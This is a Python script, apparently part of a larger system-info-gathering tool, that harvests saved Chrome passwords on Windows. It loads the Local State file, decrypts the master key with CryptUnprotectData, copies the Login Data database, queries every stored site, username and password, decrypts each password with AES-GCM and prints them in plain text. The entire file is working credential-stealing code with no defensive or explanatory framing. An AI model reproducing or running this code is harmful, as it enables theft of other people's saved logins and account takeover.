import json
from base64 import b64decode
import win32crypt
import sqlite3 
import shutil
from Crypto.Cipher import AES
from sysinfo import System_Info

sysinfo = System_Info()
UserName = sysinfo['UserName']
# UserName in sysinfo file input from Browser Password
def Browser_Password():

    print (UserName)
    # Path to the local state file
    local_state_path = f"C:\\Users\\{UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

    # Load the local state file as JSON
    with open(local_state_path, "r") as f:
        local_state = json.loads(f.read())

    # Get the encrypted key from local state
    key = local_state["os_crypt"]["encrypted_key"]

    # Base 64 decode the key
    key = b64decode(key)[5:]

    # Use CryptUnprotectData to decrypt the key
    key = win32crypt.CryptUnprotectData(key)[1]

    # Path to the Chrome Login Data database
    login_data_path = f"C:\\Users\\{UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

    # Create a copy of the Login Data database
    shutil.copy(login_data_path, login_data_path + ".bak")

    # Connect to the copied database and query the saved login data
    with sqlite3.connect(login_data_path + ".bak") as conn:
        cursor = conn.cursor()
        cursor.execute("select origin_url, username_value, password_value from logins")
        result = cursor.fetchall()

    # Function to decrypt the saved password using the encryption key
    def decrypt_password(password, key):
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        password = cipher.decrypt(password)
        password = password[:-16].decode()
        return password

    # Print the saved login data
    for row in result:
        url, username, password = row
        password = decrypt_password(password, key)
        print("{}:".format(url))
        print("\tusername: {}".format(username.encode('utf-8')))
        print("\tpassword: {}".format(password.encode('utf-8')))

Browser_Password()
